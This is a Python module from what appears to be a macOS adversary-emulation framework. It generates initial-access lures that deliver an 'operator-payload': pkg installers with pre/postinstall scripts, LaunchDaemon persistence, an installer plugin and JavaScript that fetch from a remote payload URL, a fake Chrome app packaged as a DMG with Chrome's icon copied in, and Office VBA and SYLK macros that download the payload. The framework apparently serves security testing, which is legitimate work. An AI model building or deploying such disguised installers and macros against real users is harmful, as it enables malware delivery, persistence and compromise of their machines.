import os
import dmgbuild


def install_pkg(module):
    module.set_scripts_dir('simple-package/scripts')

    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Package')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    module.make_executable('simple-package/scripts/preinstall')
    template_file = os.path.join(
        module.module_root_path, 'simple-package/scripts/preinstall')
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    module.create_dir('simple-package/scripts/files')
    dst = os.path.join(module.module_root_path,
                       'simple-package/scripts/files/operator-payload')
    module.copy_filedir(module.agent.payload_destination, dst)
    module.make_executable('simple-package/scripts/files/operator-payload')

    module.generate_payload(
        type='pkgbuild', identifier='com.simple.test', output="install_pkg.pkg")

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | sudo xargs kill',
        'sudo rm -f "/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def install_pkg_postinstall(module):
    module.set_scripts_dir('simple-package/scripts')

    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Package_postinstall')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    module.make_executable('simple-package/scripts/postinstall')
    template_file = os.path.join(
        module.module_root_path, 'simple-package/scripts/postinstall')
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    module.create_dir('simple-package/scripts/files')
    dst = os.path.join(module.module_root_path,
                       'simple-package/scripts/files/operator-payload')
    module.copy_filedir(module.agent.payload_destination, dst)
    module.make_executable('simple-package/scripts/files/operator-payload')

    module.generate_payload(
        type='pkgbuild', identifier='com.simple.test', output="install_pkg_postinstall.pkg")

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | sudo xargs kill',
        'sudo rm -f "/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def install_pkg_ld(module):
    module.set_scripts_dir('simple-package/scripts')

    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Package_with_LD')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    module.make_executable('simple-package/scripts/preinstall')
    module.make_executable('simple-package/scripts/postinstall')

    template_file = os.path.join(
        module.module_root_path, 'simple-package/scripts/files/com.simple.plist')
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    module.create_dir('simple-package/scripts/files')
    dst = os.path.join(module.module_root_path,
                       'simple-package/scripts/files/operator-payload')
    module.copy_filedir(module.agent.payload_destination, dst)
    module.make_executable('simple-package/scripts/files/operator-payload')

    module.generate_payload(
        type='pkgbuild', identifier='com.simple.agent', output="install_pkg_LD.pkg")

    cleanup = [
        'sudo launchctl unload /Library/LaunchDaemons/com.simple.agent.plist',
        'sudo rm -f "/Library/LaunchDaemons/com.simple.agent.plist"',
        'sudo rm -f "/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def install_pkg_installer_plugin(module):
    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Plugins')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(
        module.module_root_path, 'SpecialDelivery/MyInstallerPane.m')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    module.run_xcodebuild()

    module.create_dir('plugins')

    src = os.path.join(module.module_root_path,
                       'build/Release/SpecialDelivery.bundle')
    dst = os.path.join(module.module_root_path,
                       'plugins/SpecialDelivery.bundle')
    module.copy_filedir(src, dst)

    src = os.path.join(module.module_root_path,
                       'SpecialDelivery/InstallerSections.plist')
    dst = os.path.join(module.module_root_path,
                       'plugins/InstallerSections.plist')
    module.copy_filedir(src, dst)

    output = 'installer_plugin.pkg'
    module.run_pkgbuild(identifier='com.simple.agent',
                        output=output, has_scripts=False)
    src = os.path.join(module.agent.c2.full_payloads_dir, output)
    dst = os.path.join(module.module_root_path, 'plugins', output)
    module.copy_filedir(src, dst)
    module.generate_payload('productbuild-plugin',
                            identifier='com.simple.agent', output=output)

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
        'rm -f "~/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def install_pkg_js_embedded(module):
    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Package_JS')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(module.module_root_path, 'distribution.xml')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    output = 'installer_js_embedded.pkg'
    module.run_pkgbuild(identifier='com.simple.agent',
                        output=output, has_scripts=False)
    module.generate_payload(
        'productbuild-js', identifier='com.simple.agent', output=output)

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
        'rm -f "~/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def install_pkg_js_script(module):
    module.set_scripts_dir('Scripts')
    src = os.path.join(module.agent.c2.appdir,
                       'src/Templates/Installer_Package_JS_Script')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(module.module_root_path, 'distribution.xml')
    module.update_template('templatescript', "installcheck", template_file)
    template_file = os.path.join(
        module.module_root_path, 'Scripts/installcheck')
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    template_file = os.path.join(
        module.module_root_path, 'Scripts/installcheck')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.make_executable('Scripts/installcheck')

    output = 'install_pkg_js_script.pkg'
    module.run_pkgbuild(identifier='com.simple.agent',
                        output=output, has_scripts=False)
    module.generate_payload('productbuild-js-script',
                            identifier='com.simple.agent', output=output)

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
        'rm -f "~/Library/Application Support/operator-payload"'
    ]
    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def disk_image(module):
    src = os.path.join(module.agent.c2.appdir, 'src/Templates/DMG')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = 'Chrome.app/Contents/MacOS/Application Stub'
    module.make_executable(template_file)
    template_file = os.path.join(
        module.module_root_path, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)

    src = '/Applications/Google Chrome.app/Contents/Resources/app.icns'
    dst = os.path.join(module.module_root_path,
                       'Chrome.app/Contents/Resources/AutomatorApplet.icns')
    module.copy_filedir(src, dst)

    dst = os.path.join(module.module_root_path,
                       'Chrome.app/Contents/MacOS/operator-payload')
    module.copy_filedir(module.agent.payload_destination, dst)
    module.make_executable('Chrome.app/Contents/MacOS/operator-payload')

    os.chdir(module.module_root_path)
    dmgbuild.build_dmg('../../chrome.dmg', 'Chrome App', 'settings.json')

    cleanup = [
        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
        'sudo rm -rf "/Applications/Chrome.app"'
    ]

    module.generate_cleanup(cleanup)

    instructions = ['Run pkg written in Payloads']
    module.generate_instructions(instructions)


def macro_vba_excel(module):
    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(
        module.module_root_path, 'macro_vba_excel.txt')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)
    module.copy_filedir(template_file, os.path.join(
        module.agent.c2.payloads_dir, 'macro_vba_excel.txt'))

    instructions = [
        'Copy the macro from Payloads/macro_vba_excel.txt to paste into Excel Workbook',
        'When the macro is executed it will save to ~/Library/Containers/com.microsoft.Excel/Data/operator-payload"'
    ]
    module.generate_instructions(instructions)


def macro_vba_ppt(module):
    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(module.module_root_path, 'macro_vba_ppt.txt')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)
    module.copy_filedir(template_file, os.path.join(
        module.agent.c2.payloads_dir, 'macro_vba_ppt.txt'))

    instructions = [
        'Copy the macro from Payloads/macro_vba_ppt.txt to paste into Powerpoint',
        'When the macro is executed it will save to ~/Library/Containers/com.microsoft.Powerpoint/Data/operator-payload"'
    ]
    module.generate_instructions(instructions)


def macro_vba_word(module):
    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(module.module_root_path, 'macro_vba_word.txt')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)
    module.copy_filedir(template_file, os.path.join(
        module.agent.c2.payloads_dir, 'macro_vba_word.txt'))

    instructions = [
        'Copy the macro from Payloads/macro_vba_word.txt to past into Word Doc',
        'When the macro is executed it will save to ~/Library/Containers/com.microsoft.Word/Data/operator-payload"'
    ]
    module.generate_instructions(instructions)


def macro_sylk_excel(module):
    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
    dst = module.module_root_path
    module.copy_filedir(src, dst)

    template_file = os.path.join(
        module.module_root_path, 'macro_sylk_excel.txt')
    module.update_template('REMOTE_PAYLOAD_URL',
                           module.agent.payload_hosting_url, template_file)
    module.update_template('TECHNIQUE_NAME',
                           module.agent.technique_conversion_name, template_file)
    module.copy_filedir(template_file, os.path.join(
        module.agent.c2.payloads_dir, 'macro_sylk_excel.slk'))

    instructions = [
        'Double click on the Payloads/macro_sylk_excel.slk file.',
        'Excel should open the file, and prompt user to enable macros."'
    ]
    module.generate_instructions(instructions)
